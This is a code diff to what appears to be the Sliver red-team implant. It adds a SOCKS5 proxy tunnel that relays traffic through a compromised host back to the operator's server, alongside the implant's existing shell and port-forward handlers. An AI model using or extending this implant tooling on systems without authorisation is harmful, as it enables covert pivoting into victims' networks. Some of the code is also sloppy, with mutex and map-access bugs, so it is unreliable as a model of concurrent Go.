@@ -21,7 +21,9 @@ package handlers
 import (
 	"context"
 	"fmt"
+	"github.com/lesnuages/go-socks5"
 	"io"
+	"io/ioutil"
 	"net"
 	"sync"
 	"time"
@@ -45,6 +47,7 @@ var (
 	tunnelHandlers = map[uint32]TunnelHandler{
 		sliverpb.MsgShellReq:   shellReqHandler,
 		sliverpb.MsgPortfwdReq: portfwdReqHandler,
+		sliverpb.MsgSocksData: socksReqHandler,
 
 		sliverpb.MsgTunnelData:  tunnelDataHandler,
 		sliverpb.MsgTunnelClose: tunnelCloseHandler,
@@ -349,4 +352,136 @@ func portfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 		_, err := io.Copy(tWriter, tunnel.Reader)
 		cleanup(err)
 	}()
+}
+
+
+type socksTunnelPool struct {
+	tunnels map[uint64]chan []byte
+	readMutex   *sync.Mutex
+	writeMutex   *sync.Mutex
+	Sequence map[uint64]uint64
+}
+var socksTunnels = socksTunnelPool{
+	tunnels: map[uint64]chan []byte{},
+	readMutex :  &sync.Mutex{},
+	writeMutex: &sync.Mutex{},
+	Sequence: map[uint64]uint64{},
+}
+
+func socksReqHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+	var server = &socks5.Server{}
+	socksData := &sliverpb.SocksData{}
+	err := proto.Unmarshal(envelope.Data, socksData)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[socks] Failed to unmarshal protobuf %s", err)
+		// {{else}}{{end}}
+		return
+	}
+	if socksData.Data == nil{
+		return
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[socks] User to Client to (Server  to agent)   Data Sequence %d , Data Size %d \n",socksData.Sequence,len(socksData.Data))
+	// {{else}}{{end}}
+
+	if socksData.Username != "" && socksData.Password != ""{
+		cred := socks5.StaticCredentials{
+			socksData.Username: socksData.Password,
+		}
+		cator := socks5.UserPassAuthenticator{Credentials: cred}
+		server, _ = socks5.New(&socks5.Config{AuthMethods: []socks5.Authenticator{cator},Logger:log.New(ioutil.Discard,"",log.Ltime|log.Lshortfile)})
+	}else {
+		server, _ = socks5.New(&socks5.Config{Logger:log.New(ioutil.Discard,"",log.Ltime|log.Lshortfile)})
+	}
+
+	// init tunnel
+	if _,ok:=socksTunnels.tunnels[socksData.TunnelID];!ok {
+		socksTunnels.tunnels[socksData.TunnelID] = make(chan []byte, 10)
+		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
+		err := server.ServeConn(&socks{stream: socksData, conn: connection})
+		if err != nil {
+			return
+		}
+	}else {
+		socksTunnels.tunnels[socksData.TunnelID] <- socksData.Data
+	}
+}
+
+var _ net.Conn = &socks{}
+
+type socks struct {
+	stream *sliverpb.SocksData
+	conn *transports.Connection
+	mux sync.Mutex
+	Sequence uint64
+}
+
+func (s *socks) Read(b []byte) (n int, err error) {
+	socksTunnels.readMutex.Lock()
+	channel := socksTunnels.tunnels[s.stream.TunnelID]
+	socksTunnels.readMutex.Unlock()
+	data:=<-channel
+	return copy(b, data), nil
+}
+func (s *socks) Write(b []byte) (n int, err error) {
+	socksTunnels.writeMutex.Lock()
+	data, err := proto.Marshal(&sliverpb.SocksData{
+		TunnelID: s.stream.TunnelID,
+		Data:     b,
+		Sequence: s.Sequence,
+	})
+	if !s.conn.IsOpen{
+		return 0, err
+	}
+	// {{if .Config.Debug}}
+	log.Printf("[socks] (agent to Server) to Client to User   Data Sequence %d , Data Size %d Data %v\n",s.Sequence,len(b),b)
+	// {{else}}{{end}}
+	s.conn.Send <- &sliverpb.Envelope{
+		Type: sliverpb.MsgSocksData,
+		Data: data,
+	}
+	socksTunnels.writeMutex.Unlock()
+	s.Sequence++
+	return len(b), err
+}
+
+func (s *socks) Close() error {
+	close(socksTunnels.tunnels[s.stream.TunnelID])
+	delete(socksTunnels.tunnels,s.stream.TunnelID)
+	data, err := proto.Marshal(&sliverpb.SocksData{
+		TunnelID: s.stream.TunnelID,
+		CloseConn: true,
+	})
+	if !s.conn.IsOpen{
+		return err
+	}
+	s.conn.Send <- &sliverpb.Envelope{
+		Type: sliverpb.MsgSocksData,
+		Data: data,
+	}
+	return err
+}
+
+func (c *socks) LocalAddr() net.Addr {
+	return nil
+}
+
+func (c *socks) RemoteAddr() net.Addr {
+	return nil
+}
+
+// TODO impl
+func (c *socks) SetDeadline(t time.Time) error {
+	return nil
+}
+
+// TODO impl
+func (c *socks) SetReadDeadline(t time.Time) error {
+	return nil
+}
+
+// TODO impl
+func (c *socks) SetWriteDeadline(t time.Time) error {
+	return nil
 }
